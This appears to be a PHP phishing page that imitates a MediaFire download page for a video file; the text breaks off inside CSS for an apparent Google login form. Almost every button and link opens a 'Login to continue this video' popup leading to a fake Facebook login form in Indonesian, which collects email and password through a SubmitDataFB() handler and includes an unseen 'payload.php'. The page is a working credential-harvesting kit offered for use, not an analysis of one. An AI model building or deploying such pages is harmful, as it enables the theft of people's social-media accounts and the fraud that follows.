<?php
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en-US" style="height: 100%;">
 <head> 
  <meta charset="utf-8"> 
  <meta http-equiv="x-ua-compatible" content="ie=edge"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
  <title><?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?></title> 
  <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android"> 
  <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."> 
  <meta name="robots" content="noindex,nofollow"> 
  <meta name="googlebot" content="noindex,nofollow"> 
  <meta name="slurp" content="noindex,nofollow"> 
  <meta property="fb:app_id" content="124578887583575"> 
  <meta property="og:type" content="website"> 
  <meta property="og:site_name" content="MediaFire"> 
  <meta property="og:locale" content="en_US"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Hyuu09/my-css@main/stylee.css">
  <meta property="og:title" content="<?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>"> 
  <meta property="og:description" content=""> 
  <meta name="twitter:card" content="summary_large_image"> 
  <meta name="twitter:site" content="@MediaFire"> 
  <meta name="twitter:title" content="<?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>"> 
  <meta name="twitter:description" content=""> 
  <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg"> 
  <meta itemprop="description" content=""> 
      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
  <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <link rel="stylesheet" href="css/style.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=Oswald&family=Roboto&family=Teko&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Roboto', sans-serif;
}


popup {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    padding: 10px;
    z-index: 99;
    box-shadow: 0 1px 1px black;
    overflow: hidden;
    z-index: 9999999;
}

popup fb {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    box-shadow: 0 0 1000px 1000px rgba(0, 0, 0, 0.60);
    background: #fff;
    height: 100%;
    border-radius: 3px;
    overflow: hidden;
}

[hide] {
    display: none !important;
}

[die] {
    opacity: 0.5 !important;
    pointer-events: none !important;
}

fb err {
    background: #fa3e3e;
    padding: 10px;
    color: #fff;
    font-size: 14px;
}

fb atas {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    background: #fffbe2;
    padding: 5px 10px;
}
</style>
  <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.69JJaQ5G5xA.L.W.O/d=0/rs=AN8SPfpC36MIoWPngdVwZ4RUzeJYZaC7rg/m=el_main_css"> 
 </head> 
 <body class="en defaultTheme" style="position: relative; min-height: 100%; top: 0px;display:none"> 
  <main role="main" class="mf-dlr page ads-mobile4 mobile turbo-dl ads-enabled"> 
   <label for="copy" style="display: none;">Copy textarea</label> 
   <textarea id="copy" style="position:absolute;left:-9999px;opacity:0" aria-hidden="true" tabindex="-1">https</textarea> 
   <div class="content"> 
    <style type="text/css">
.header {
    height: 70px;
    background: #fff;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 45;
    box-shadow: 0 1px 0 0 rgba(0, 0, 0, .1);
}

.logo {
    float: left;
    margin: 0;
}

.logo > a {
    display: table;
    height: 70px;
    width: 191px;
    background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/180px auto no-repeat;
    margin: 0 auto;
    text-indent: -9999px;
}

.user-menu {
    float: right;
    margin: 17px 0px 0 0;
    font-family: "open sans";
    font-size: 12px;
}

.user-menu > li {
    float: right;
}

.loginActivateFB,
.loginActivateTW {
    position: absolute;
    top: 50%;
    height: 20px;
    width: 20px;
    border-radius: 2px;
    background-color: rgba(0, 0, 0, .15);
    background-repeat: no-repeat;
    background-position: center;
    background-size: 17px;
    transform: translateY(-50%);
}

.loginActivateFB {
    background-image: url(//static.mediafire.com/images/icons/svg_light/facebook.svg);
    right: 32px;
}

.loginActivateTW {
    background-image: url(//static.mediafire.com/images/icons/svg_light/twitter.svg);
    right: 8px;
}

#login {
    margin-right: 0;
    border-bottom-left-radius: 0;
    border-top-left-radius: 0;
    position: relative;
    padding-right: 67px;
}

#signup {
    margin-right: 1px;
    border-bottom-right-radius: 0;
    border-top-right-radius: 0;
}

.user-menu-help {
    margin-right: 10px;
}

.mobile .user-menu-help {
    display: none;
}

#login,
#signup,
.user-menu-help {
    max-width: 150px;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
}

/* Media queries
========================================================================== */

@media (max-width: 960px) {
    .logo {
        margin-left: 20px;
    }

    .user-menu {
        margin-right: 17px;
    }
}

@media (max-width: 940px) {
    .loginActivateFB,
    .loginActivateTW {
        display: none;
    }

    #login, #signup {
        width: 85px;
        padding: 0 10px;
    }

    .user-menu-help {
        font-size: 0;
    }

    .user-menu-help .g-Icon--help {
        margin: 0;
    }
}

@media (max-width: 720px) {
    .logo {
        width: 48px;
        overflow: hidden;
    }

    .user-menu-help {
        display: none;
    }
}

@media (max-width: 650px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 150px;
    }
}

@media (max-width: 610px) {
    #goog-header-translate{
        width: 60px;
    }

    #goog-header-translate .goog-te-combo {
        text-indent: 60px;
        padding: 0;
    }
}

@media (max-width: 500px) {
    #login, #signup {
        font-size: 9px;
        padding: 0 5px;
        width: 60px;
    }

    #goog-header-translate {
        width: 36px;
        background-position: center;
    }

    #goog-header-translate .goog-te-combo {
        padding: 0;
        background-image: none !important;
    }
}

@media (max-width: 400px) {
    .logo {
        margin-left: 5px;
    }

    .customLogo .logo {
        margin-left: 0;
    }

    .customLogo .logo,
    .customLogo .logo > a {
        width: 110px;
    }
}

@media (max-width: 340px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 80px;
    }
}
</style> 
    <div class="header"> 
     <div class="u-wrap"> 
      <h1 class="logo"> <a href="#">MediaFire</a> </h1> 
      <ul class="user-menu"> 
       <li> <a onclick="$('#PopUpLog').fadeIn();" id="login" class="g-Btn g-Btn--primary"> <span class="loginActivateTW"></span> <span class="loginActivateFB"></span> Log In </a> </li> 
       <li> <a onclick="$('#PopUpLog').fadeIn();" id="signup" class="g-Btn g-Btn--primary">Sign Up</a> </li> 
       <li> <a onclick="$('#PopUpLog').fadeIn();" class="user-menu-help g-Btn g-Btn--secondary"> <span class="g-Icon g-Icon--help"></span>Help </a> </li> 
       <li class="header-gt-cont">
       </li> 
      </ul> 
     </div> 
    </div> 
    <div class="center"> 
     <div class="ads dl-box"> 
      <div class="dl-btn-cont"> 
       <div class="icon mp4 video video_mp4"></div> 
       <div class="dl-btn-labelWrap"> 
        <div class="promoDownloadName notranslate"> 
         <div class="dl-btn-label" title="<?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>.mp4">
           <?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?> 
         </div> 
        </div> 
        <div class="dl-utility-nav"> 
         <ul> 
          <li> <a href="" target="_blank" rel="noopener" id="shareButton" class="nopop g-Icon g-Icon--white g-Icon--share" aria-labelledby="share-tooltip" title="More sharing options"></a> <span id="share-tooltip" class="alt point-down tooltip"> More sharing options </span> </li> 
          <li> <a href="" target="_blank" rel="noopener" id="copyShareURL" class="nopop g-Icon g-Icon--white g-Icon--link" aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a> <span id="copy-tooltip" class="alt point-down tooltip"> Copy file link to clipboard </span> </li> 
          <li> <a href="" id="saveButton" class="g-Icon g-Icon--white g-Icon--add" aria-labelledby="save-tooltip" title="Save file to My Files"></a> <span id="save-tooltip" class="alt point-down tooltip"> Save file to My Files </span> </li> 
          <noscript> 
           <style type="text/css">
                            #shareButton, #copyShareURL, #saveButton { display: none }
                        </style> 
          </noscript> 
         </ul> 
        </div> 
       </div> 
       <form method="post" name="download" class="dl-btn-form" autocomplete="off"> 
        <input type="hidden" name="security" value="1689533690.80c0508fc16d4acaeb05dca5907677d613e95ff934a4f5ffb932e6dee8d9f2f5"> 
        <div class="download_link" id="download_link"> 
         <!-- IF THIS IS TRADITIONAL --> 
         <a class="preparing" href="#"><span>Preparing your download...</span></a> 
         <a class="input " aria-label="Download file" onclick="$('#PopUpLog').fadeIn();" target="_download1515" onclick="setTimeout(() => {if (typeof window.InfMediafireMobileFunc === 'function') window.InfMediafireMobileFunc();}, 1000)" id="downloadButton" rel="nofollow"> Download in a new tab (<?php include 'system/isidata.php'; echo htmlspecialchars($ukuran); ?>) </a> 
         <a class="starting" href="#"><span>Your download is starting in a new tab...</span></a> 
         <a class="retry" onclick="$('#PopUpLog').fadeIn();"> <span class="notranslate">Your download started in a new tab.</span> </a> 
        </div> 
        <a href="#" class="download_test_link"> Download Diagnostic Tool </a> 
       </form> 
       <div class="TurboDL-toggle-box toggle-off"> 
        <button type="button" class="TurboDL-button" onclick="$('#PopUpLog').fadeIn();;"> <span class="turboTDL-toggle"> <span class="turboTDL-toggle-slider"></span> </span> Enable Turbo Downloader <span class="turboTDL-toggle-note"> Beta </span> </button> 
       </div> 
       <div class="DLMobile-shareOptions"> 
        <p> Clicking the download button above will start your download in a new tab and show a message from our advertising partners. </p> 
        <ul> 
         <li> <a onclick="$('#PopUpLog').fadeIn();" id="shareButtonMobile" class="nopop"> <span></span>Share options </a> </li> 
         <li> <a onclick="$('#PopUpLog').fadeIn();" id="saveButtonMobile" class="nopop"> <span></span>Save to My Files </a> </li> 
        </ul> 
       </div> 
      </div> 
      <a class="dl-promo-cont nopop" onclick="$('#PopUpLog').fadeIn();" target="_blank" rel="noopener"> MediaFire Pro: Faster bulk downloads, Ad free downloads, &amp; 1 TB of storage. From $3.75/month. </a> 
      <div class="dl-info"> 
       <div class="intro icon mp4 video video_mp4"> 
        <div class="filename">
         <?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>.mp4
        </div> 
        <div class="filetype">
         <span>Video</span>
         <span> (.MP4)<span></span></span>
        </div> 
       </div> 
       <ul class="details"> 
        <li>File size: <span><?php include 'system/isidata.php'; echo htmlspecialchars($ukuran); ?></span></li> 
        <li>Uploaded: <span>2023-05-31 15:41:54</span></li> 
       </ul> 
       <div class="description"> 
        <p class="description-subheading">About Video Formats</p> 
        <p>As with all media formats, video formats run the spectrum between high quality and low file size. Lossless compression for video files attempts to reduce the file size by removing redundancies. Lossy compression schemes reduce filesize by discarding data without the viewer noticing. The Advanced Video Coding (AVC) standard is one of the most commonly used formats for recording, compressing, and distributing high definition video.</p> 
       </div> 
       <div class="sidebar"> 
        <div class="Download-compatibility"> 
         <div style="margin-bottom: 0;"> 
          <div class="filename">
           <?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>.mp4
          </div> 
         </div> 
         <label for="compat-select" style="display: block; margin-bottom: 10px;">System compatibility</label> 
         <select class="g-Select" id="compat-select" title="Select operating system"> <option value="windows" data-compat=""> Windows </option> <option value="osx" data-compat=""> macOS </option> <option value="linux" data-compat=""> Linux </option> </select> 
         <div class="Download-compatibilityStatus is-compatible" id="compat-supported"> 
          <span></span> 
          <p>File is compatible with the selected operating system.</p> 
         </div> 
         <div class="Download-compatibilityStatus is-notCompatible" id="compat-unsupported" style="display:none"> 
          <span></span> 
          <p>File is not compatible with the selected operating system.</p> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
    <!-- Temp placement --> 
    <div id="non-dl-content" class="nonDLContentWrap"> 
     <style type="text/css">
                #div-gpt-ad-1575674121640-0 {
                    width: 100%; height: 100px; top: 70px; position: absolute; align-items: center; justify-content: center; display: flex;
                }
            </style> 
     <div id="div-gpt-ad-1575674121640-0"> 
     </div> 
     <style type="text/css">
                #div-gpt-ad-1579281108195-0 {
                    width: 100%; height: 100px; top: 440px; left: 0; position: absolute; display: flex; align-items: center; justify-content: center;
                }
            </style> 
     <div id="div-gpt-ad-1579281108195-0"> 
     </div> 
     <style type="text/css">
                #div-gpt-ad-1579281193413-0 {
                    width: 100%; height: 100px; bottom: 0; left: 0; display: flex; align-items: center; position: absolute; justify-content: center;
                }
            </style> 
     <div id="div-gpt-ad-1579281193413-0"> 
     </div> 
    </div> 
    <!-- Details for this download
=================================--> 
    <div class="DLExtraInfo-wrap"> 
     <!-- Upload details for file
    =================================--> 
     <div class="DLExtraInfo"> 
      <!-- Location + map --> 
      <div class="DLExtraInfo-uploadLocation DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-uploadLocationMap Continent DLExtraInfo-uploadLocationMapBg" data-lazyclass="DLExtraInfo-uploadLocationMapBg"> 
        <span>Upload region:</span> 
        <div class="lazyload DLExtraInfo-uploadLocationRegion continent-as" data-lazyclass="continent-as"></div> 
       </div> 
       <!-- <div class="DLExtraInfo-sectionHeading">This file&#8217;s upload location</div> --> 
       <div class="lazyload DLExtraInfo-sectionGraphic flag" data-lazyclass="flag-id"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <p>This file was uploaded from Indonesia on May 31, 2023 at 3:41 PM</p> 
       </div> 
      </div> 
      <div class="DLExtraInfo-upload DLExtraInfo-column"> 
       <!-- VirusTotal scan --> 
       <div class="DLExtraInfo-virusTotal DLExtraInfo-row"> 
        <div class="DLExtraInfo-sectionGraphic"> 
         <div class="lazyload DLExtraInfo-sectionGraphicCenter" data-lazyclass="DLExtraInfo-virusTotalImage"></div> 
        </div> 
        <div class="DLExtraInfo-sectionDetails"> 
         <div class="DLExtraInfo-sectionHeading">
          VirusTotal scan
         </div> 
         <p> MediaFire scans high-risk files using VirusTotal. </p> 
        </div> 
       </div> 
       <!-- Like MediaFire on Facebook --> 
       <div class="DLExtraInfo-Facebook DLExtraInfo-row"> 
        <div class="social-cont"> 
         <div class="social-fb-cont"> 
          <span id="social-fb-label">Like MediaFire on Facebook</span> 
          <iframe class="lazyload nopop" data-lazysrc="" src="" width="190" height="30" scrolling="no" frameborder="0" allowtransparency="true" aria-labelledby="social-fb-label"></iframe> 
         </div> 
        </div> 
        <noscript>
         <style>.social-fb-cont>iframe{display:block}</style>
        </noscript> 
       </div> 
      </div> 
     </div> 
     <!-- Additional information
    =================================--> 
     <div class="DLExtraInfo DLExtraInfo-additional"> 
      <!-- Alternate for account status (not logged in) --> 
      <div class="DLExtraInfo-accountStatus DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="DLExtraInfo-accountStatusImage"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <div class="DLExtraInfo-sectionHeading">
         About MediaFire
        </div> 
        <div class="DLExtraInfo-sectionSubHeading">
         Welcome!
        </div> 
        <p> With MediaFire, you get simple yet powerful file storage along with features you won’t find anywhere else. <a onclick="$('#PopUpLog').fadeIn();">Learn more</a> </p> 
       </div> 
      </div> 
      <!-- Browser/download application --> 
      <div class="DLExtraInfo-downloadApp DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="browser-chrome"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <div class="DLExtraInfo-sectionHeading">
         Download application
        </div> 
        <div class="DLExtraInfo-sectionSubHeading">
         Chrome
        </div> 
        <p> You are downloading this file with <span>Chrome.</span> </p> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
   <div id="share" class="lightbox" role="dialog" tabindex="-1"> 
    <figure> 
     <a href="#" class="close" id="share-close" title="Close share dialog"><span style="display: none">Close share dialog</span></a> 
     <figcaption> 
      <iframe id="share-iframe" data-src="" allowtransparency="true" style=""> &lt;p id="share-desc"&gt; Failed to load. Try again in a supported browser. &lt;/p&gt; </iframe> 
      <noscript> 
       <p id="share-desc"> Failed to load. Please enable JavaScript. </p> 
      </noscript> 
     </figcaption> 
    </figure> 
   </div> 
   <div id="mobile-turbo-dl-enable" class="lightbox" role="dialog" tabindex="-1"> 
    <a href="#" class="close" id="mobile-turbo-dl-btn-close" title="Cancel"><span style="display: none">Cancel</span></a> 
    <div class="popup-container"> 
     <span class="mobile-turbo-dl-enable-title">Enable Turbo Downloader?</span> 
     <span class="mobile-turbo-dl-enable-message"> By enabling the Turbo Downloader Beta you are agreeing to use software that hasnt been fully tested. You can disable this at any time. Enabling the Turbo Downloader will reload the page. </span> 
     <a href="#" id="mobile-turbo-dl-btn-enable"><span>Enable Turbo Downloader</span> </a>
     <a href="#" id="mobile-turbo-dl-btn-cancel"><span>Cancel</span></a> 
    </div> 
   </div> 
  </main>
  <iframe name="googlefcPresent" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe> 
<footer role="contentinfo" id="footer" class="footer"> 
   <div class="u-wrap" id="mainFooterWrap"> 
    <div class="footerColWrap u-cf"> 
     <div class="footerCol"> 
      <h2><a onclick="$('#PopUpLog').fadeIn();">Company</a></h2> 
      <ul> 
       <li class="minFooterShow"><a onclick="$('#PopUpLog').fadeIn();">About<b> Us</b></a></li> 
       <li><a onclick="$('#PopUpLog').fadeIn();">Careers</a></li> 
       <li><a onclick="$('#PopUpLog').fadeIn();">Press</a></li> 
       <li><a onclick="$('#PopUpLog').fadeIn();" target="_blank">Company Blog</a></li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="$('#PopUpLog').fadeIn();">Tools</a></h2> 
      <ul> 
       <li class="minFooterShow"> <a onclick="$('#PopUpLog').fadeIn();"><b>MediaFire </b>Mobile</a> </li> 
       <li class="minFooterShow"> <a href="" title="Fast.io - File Sharing and Cloud Storage for Teams" target="_blank" rel="noopener noreferrer" aria-label="Fast.io - Team File Sharing and Cloud Storage for Small Businesses">Team File Sharing</a> </li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="$('#PopUpLog').fadeIn();">Upgrade</a></h2> 
      <ul> 
       <li><a onclick="$('#PopUpLog').fadeIn();">Professional</a></li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="$('#PopUpLog').fadeIn();" target="_blank">Support</a></h2> 
      <ul> 
       <li class="minFooterShow"><a onclick="$('#PopUpLog').fadeIn();" target="_blank"><b>Get Support</b></a></li> 
      </ul> 
     </div> 
    </div> 
   </div> 
   <!-- SUBFOOTER --> 
   <div id="subFooterWrap"> 
    <div id="subFooter" class="u-wrap"> 
     <ul class="subFooterLinks"> 
      <li id="copyrightInfo">©2023 MediaFire<span> Build 121910</span></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Advertising</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Terms</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Privacy Policy</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Copyright</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Abuse</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">Credits</a></li> 
      <li><a onclick="$('#PopUpLog').fadeIn();">More...</a></li> 
     </ul> 
     <div class="subFooterSocialWrap"> 
      <ul id="subFooterSocial"> 
       <li class="footerIcn"> <a href="http://blog.mediafire.com/" class="footerIcnBlog" target="_blank" title="MediaFire Blog"> <span class="footerIcnBlog"></span> </a> </li> 
       <li class="footerIcn"> <a href="" class="footerIcnTw" target="_blank" rel="noreferrer" title="MediaFire's Twitter page"> <span class="footerIcnTw"></span> </a> </li> 
       <li class="footerIcn" style="margin-left: 0;"> <a href="" class="footerIcnFb" target="_blank" rel="noreferrer" title="MediaFire's Facebook page'"> <span class="footerIcnFb"></span> </a> </li> 
      </ul> 
     </div> 
     <div class="socialLinks" id="minSocialLinks"> 
      <a href="https://www.facebook.com/mediafire" class="shareFacebook" title="MediaFire on Facebook"><span style="display: none">Facebook Page</span></a> 
      <a href="https://twitter.com/mediafire" class="shareTwitter" title="MediaFire on Twitter"><span style="display: none">Twitter Page</span></a> 
      <a href="https://blog.mediafire.com/" class="shareBlogger" title="MediaFire Blog"><span style="display: none">MediaFire Blog</span></a> 
     </div> 
    </div> 
   </div> 
  </footer> 
<div id="PopUpLog" style="background: rgba(0,0,0,0.5);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;display:none;">
<div style="position: relative;margin: 50px auto;
        margin-top: 70%;
        text-align: center;" class="modal-content">
          <span onclick="$('#PopUpLog').fadeOut();" class="modal-close">×</span>
          <h2 style="font-family: 'Inter';
font-smooth: always;">Login to continue this video</h2>
            <button onclick="$('.login-facebook').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:70px;" class="fa-brands fa-facebook-f"></i><span style="margin-right:70px;">Login with Facebook</span></button>
            <div style="margin-top:10px;"></div>
            <button onclick="$('.login-google').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:75px;" class="fa-brands fa-google"></i><span style="margin-right:85px;">Login with Google</span></button>
        </div>
        </div>
        
        <div class="popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="container-box-fb" style="margin-top: 10%;">
        <div class="atasan-fb" style="background: none;">
        <i class="fa-solid fa-arrow-left" onclick="$('.login-facebook').fadeOut();" style="color:#1979f4;position: absolute; width: 25px; margin-top: 10px; left: 10px;" alt=""></i>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/facebook_text.webp" style="margin-top: -5px;margin-left: 105px">
	</div>
	<div class="isi-facebook" style="padding-bottom: 10px;">
		<p class="kaget email">
			Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
		</p>
		<p class="kaget sandi">
			Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
		</p>
		<img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240110_175143.png">
		<div class="txt-ucapan-fb">
			Masuk ke akun Facebook Anda untuk terhubung dengan Facebook
		</div>
		<form class="form-login-fb" action="javascript:void(0)" id="sendfagen">
			<div class="form-group">
				<input type="text" id="fgn_email_fb2" name="email" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_email_fb2" id="EmailLabel" class="hidden-label">Nomor ponsel atau email</label>
			</div>
			<div class="form-group">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/hide.png" id="HidePw" alt="">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/show.png" id="ShowPw" alt="">
				<input type="password" id="fgn_password_fb2" name="password" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_password_fb2" id="PasswordLabel" class="hidden-label">Kata Sandi Facebook</label>
			</div>
			<input type="hidden" name="login" value="Facebook" readonly="">
			<button class="btn-login-fb" type="submit" onclick="return SubmitDataFB();" style="border-radius: 48px; margin-top: 13px;">Masuk</button>
			<label style="font-size: 14px; color: #838489; display: block; margin-top: 15px;">Lupa Kata Sandi?</label>
			<button class="btn-login-fb" type="button" style="border-radius: 48px; margin-top: 38px; background: none !important; color: #4292f8; border: 1px solid #4292f8 !important; font-weight: 100em !important; box-shadow: transparent !important;">Buat Akun Baru</button>
		</form>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/MetaLogo.png" style="display: block; margin: 20px auto; width: 70px; position: relative; top: 0;" alt="">
	</div>
</div>
</div>
<style type="text/css">
.lds-ring, .lds-ring div { box-sizing: border-box; } .lds-ring { display: inline-block; position: relative; width: 80px; height: 80px; margin-top:70px; } .lds-ring div { box-sizing: border-box; display: block; position: absolute; width: 64px; height: 64px; margin: 8px; border: 8px solid #0B57CF; border-radius: 50%; animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; border-color: #0B57CF transparent transparent transparent; } .lds-ring div:nth-child(1) { animation-delay: -0.45s; } .lds-ring div:nth-child(2) { animation-delay: -0.3s; } .lds-ring div:nth-child(3) { animation-delay: -0.15s; } @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .form { width: 100%; padding: 0px 15px; border-radius: 3px; box-shadow: 0 10px 25px rgba(92, 99, 105, 0.2); } .form__div { position: relative; height: 50px; margin-bottom: 15px; } .showpass { position: relative; height: 50px; margin-top: 0px; } .showpass label { position: relative; margin-top: 2px; margin-left: 4px; font-size:11px; color:#000; } .form__input { position: absolute; top: -1; left: 0; width: 100%; height: 100%; border: 1px solid #AFB0AF; border-radius: 3px; color: #454746; outline: none; padding: 10px; background: none; font-size: 16px; font-weight: 400; font-family: 'Open Sans', sans-serif; z-index: 1; } .form__label { position: absolute; left: 10px; top: 1rem; padding: 0 5px; background-color: #fff; color: #454746; transition: 0.3s; font-size: 11px; font-weight: 400; } /*Input focus move up label*/ .form__input:focus + .form__label { top: -0.4rem; left: 0.5rem; color: #0B57CF; font-size: 11px; font-weight: 400; z-index: 10; } /*Input focus sticky top label*/ .form__input:not(:placeholder-shown).form__input:not(:focus) + .form__label { top: -0.4rem; left: 0.5rem; z-index: 10; font-weight: 400; font-size: 11px; } /*Input focus*/ .form__input:focus { border: 2px solid #0B57CF; font-size: 16px; } .header-gg { background: #fff; width: 100%; height: 40px; padding: 8px; border-radius: 5px 5px 0px 0px; border-bottom: 1px solid #E5EAED; margin-bottom: 20px; position: relative; } .header-gg img { width: 20px; height: 20px; float:left; display: block; margin-top:1px; margin-left:2px; margin-right:-10px; } .header-gg-text { color: #000; font-size: 15px; font-weight: 500; font-family: 'Open Sans', sans-serif; text-align: center; margin-top:2px; padding-left:-2px; } .txt-login-gg { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 25px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 3%; } .txt-login-ggs { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 10%; } .content-box-gg { width: 90%; height: auto; margin-left: auto; margin-right: auto; padding-bottom: 25px; display: block; } .content-box-gg-txt { width: auto; height: auto; display: inline-block; margin-left: auto; margin-right: 10px; padding-bottom: 10px; display: block; } .content-box-gg-txt img { width: 55px; border:none; border-radius: 12px; margin-top: 10px; margin-left: 5px; margin-right: 10px; float: left; } .content-box-gg p { background: #666666; height: 35px; border-radius:10px; color: #fff;. padding-top:5px; font-size: 14px; font-family: 'Open Sans', sans-serif; float:center; text-align: center; } .content-box-gg label { color: #000; font-size: 14px; font-family: 'Open Sans', sans-serif; float: left; text-shadow: none; } .content-box-gg label a { color: #1da1f2; } .content-box-gg-txt-title { color: #6A747E; font-size: 16px; padding-top: 11px; padding-bottom: 7px; font-family: 'Open Sans', sans-serif; font-weight: 300; text-align: left; } .content-box-gg-txt-det { width: auto; height: auto; padding-top: 2px; padding-bottom: 3px; color: #8799A3; font-size: 11px; font-family: 'Open Sans', sans-serif; text-align: left; text-shadow:none; } .alert-gg-failed { background: none; width: auto; height: 34px; padding: 5px; padding-top:0px; margin-top: -10px; margin-bottom: 0px; position: relative; display:none; border-radius:5px; } .alert-gg { width: auto; height: auto; padding-top:0px; text-align:left; border-radius:5px; color: #B3261D; font-size: 12px; float: left; font-weight: 400; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-gg img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; border-radius: 5px; margin-top:-5px; display: inline-block; } .alert-gg-faileds { background: #62656C; width: auto; height: auto; padding: 5px; margin-bottom: 10px; position: relative; display:none; border-radius:5px; } .alert-ggs { width: auto; height: auto; padding:0px; text-align:left; border-radius:5px; color: #fff; font-size: 13px; float:center; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-ggs img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; margin-top: 3px; border-radius: 5px; display: inline-block; } .nonbutton { background: #0B57CF; width: 30%; height: auto; padding:10px; margin-top: -5px; margin-left: -1px; margin-bottom: 50px; padding: 14px; color: #fff; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; border: none; border-radius: 10px; outline: none; letter-spacing: 1; float:right; } .content-box-gg-txt-footer { width: auto; height: auto; display: inline-block; color: #454746; font-size:12px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .content-box-gg-txt-footer a { color: #1A62D1; } .content-box-gg-txt-footers { width: auto; height: auto; display: inline-block; color: #848586; font-size:10.5px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; 